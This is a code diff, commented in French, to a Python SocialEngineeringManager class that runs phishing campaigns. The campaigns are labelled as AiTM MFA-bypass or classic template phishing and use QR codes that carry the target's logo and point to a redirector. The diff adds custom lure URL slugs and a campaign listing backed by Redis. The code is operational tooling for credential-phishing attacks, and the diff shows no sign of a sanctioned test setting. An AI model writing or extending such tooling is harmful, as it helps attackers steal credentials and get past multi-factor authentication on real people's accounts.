@@ -56,11 +56,12 @@ class SocialEngineeringManager:
                 
         return None
 
-    def create_campaign(self, name: str, template_id: str, target_email: str = None, campaign_type: str = "aitm", use_logo: bool = True) -> Dict[str, str]:
+    def create_campaign(self, name: str, template_id: str, target_email: str = None, campaign_type: str = "aitm", use_logo: bool = True, custom_slug: str = None) -> Dict[str, str]:
         """
         Crée une nouvelle campagne de phishing.
         campaign_type: "aitm" (MFA Bypass) ou "template" (Classic Phishing)
         use_logo: Intégrer le logo de la cible dans le QR Code si possible.
+        custom_slug: Personnaliser l'URL (/v5/r/custom-slug) au lieu d'un UUID.
         """
         if template_id not in self.templates:
             # Re-load templates just in case new ones were added
@@ -68,37 +69,52 @@ class SocialEngineeringManager:
             if template_id not in self.templates:
                 raise ValueError(f"Template inconnue: {template_id}")
             
-        campaign_id = str(uuid.uuid4())
+        if custom_slug:
+            # Validation du slug
+            if not custom_slug.replace("-", "").isalnum():
+                 raise ValueError("Le slug ne doit contenir que des lettres, chiffres et tirets.")
+            
+            # Vérification de disponibilité
+            if redis_cache.exists(f"campaign:{custom_slug}"):
+                raise ValueError(f"Le slug '{custom_slug}' est déjà utilisé.")
+            
+            campaign_id = custom_slug
+        else:
+            campaign_id = str(uuid.uuid4())
+            
         template = self.templates[template_id]
         
         # URL de redirection (pointe vers notre Smart Redirector)
         # Format: /v5/r/{campaign_id}
         redirect_url = f"{self.base_domain}/v5/r/{campaign_id}"
         
-        # Configuration QR Code
-        qr_config = QRConfig()
-        if use_logo:
-            # Tentative de trouver un logo correspondant au template
-            logo_path = self._get_logo_path(template_id)
-            if logo_path:
-                qr_config.logo_path = logo_path
-                # Ajuster l'échelle si nécessaire, par défaut 4
-                qr_config.logo_scale_factor = 4
-
-        # Génération du QR Code associé
-        qr_filename = f"campaign_{campaign_id}.png"
-        
         # Directory for QR codes: core/assets/qr_codes
         base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
         qr_dir = os.path.join(base_dir, "assets", "qr_codes")
         
         if not os.path.exists(qr_dir):
-            os.makedirs(qr_dir)
+            os.makedirs(qr_dir, exist_ok=True)
             
+        qr_filename = f"campaign_{campaign_id}.png"
         full_qr_path = os.path.join(qr_dir, qr_filename)
         
+        # Configuration QR Code
+        qr_config = QRConfig()
+        if use_logo:
+            logo_path = self._get_logo_path(template_id)
+            if logo_path:
+                qr_config.logo_path = logo_path
+                qr_config.logo_scale_factor = 4
+            else:
+                # Si pas de logo spécifique, utiliser un logo générique ou aucun
+                pass
+
         # Generate QR
-        success, message = self.qr_system.generate_qr(redirect_url, full_qr_path, config=qr_config)
+        success, message = self.qr_system.generate_qr(
+            data=redirect_url, 
+            output_path=full_qr_path, 
+            config=qr_config
+        )
         
         if not success:
             print(f"[-] Failed to generate QR code for campaign {campaign_id}: {message}")
@@ -125,6 +141,23 @@ class SocialEngineeringManager:
         self._save_campaign(campaign_id, campaign_data)
         return campaign_data
 
+    def list_campaigns(self) -> List[Dict]:
+        """Retourne la liste des campagnes actives."""
+        campaign_ids = redis_cache.smembers("campaigns:list")
+        campaigns = []
+        if campaign_ids:
+            for cid in campaign_ids:
+                # smembers returns bytes or strings depending on redis client config
+                if isinstance(cid, bytes):
+                    cid = cid.decode('utf-8')
+                data = self.get_campaign(cid)
+                if data:
+                    campaigns.append(data)
+                else:
+                    # Cleanup expired campaigns from list
+                    redis_cache.srem("campaigns:list", cid)
+        return campaigns
+
     def get_campaign(self, campaign_id: str) -> Optional[Dict]:
         return redis_cache.get(f"campaign:{campaign_id}")
 
@@ -148,6 +181,7 @@ class SocialEngineeringManager:
 
     def _save_campaign(self, campaign_id: str, data: Dict):
         redis_cache.set(f"campaign:{campaign_id}", data, expire=self.CAMPAIGN_TTL)
+        redis_cache.sadd("campaigns:list", campaign_id)
 
 # Instance globale
 social_manager = SocialEngineeringManager()
